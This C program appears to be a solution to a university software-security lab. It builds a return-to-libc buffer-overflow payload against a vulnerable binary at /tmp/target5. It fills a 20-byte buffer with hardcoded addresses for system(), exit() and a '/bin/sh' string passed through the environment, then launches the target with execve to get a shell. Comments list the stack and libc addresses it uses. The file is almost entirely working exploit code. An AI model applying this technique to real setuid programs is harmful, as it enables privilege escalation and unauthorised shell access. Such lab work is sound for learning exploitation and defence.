#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

#define LEN 20

char payload[LEN];


int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { "/bin/sh", NULL };

  for (int i = 0; i < LEN; i++)
  {
    payload[i] = 'A';
  }  

  int system = 8;
  payload[system + 0] = 0xa0;
  payload[system + 1] = 0x4d;
  payload[system + 2] = 0xe5;
  payload[system + 3] = 0xb7;


  int exit = 12;
  payload[exit + 0] = 0xd0;
  payload[exit + 1] = 0x89;
  payload[exit + 2] = 0xe4;
  payload[exit + 3] = 0xb7;
 
  int binsh = 12;
  payload[16] = 0xe7;
  payload[17] = 0xff;
  payload[18] = 0xff;
  payload[19] = 0xbf;
  
  //buf: 0xbffffe48
  //eip: 0xbffffe50 = 0x080484e8
  //bin_sh: 0xbfffffe7
  //system: 0xb7e54da0
  //exit: 0xb7e489d0


  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
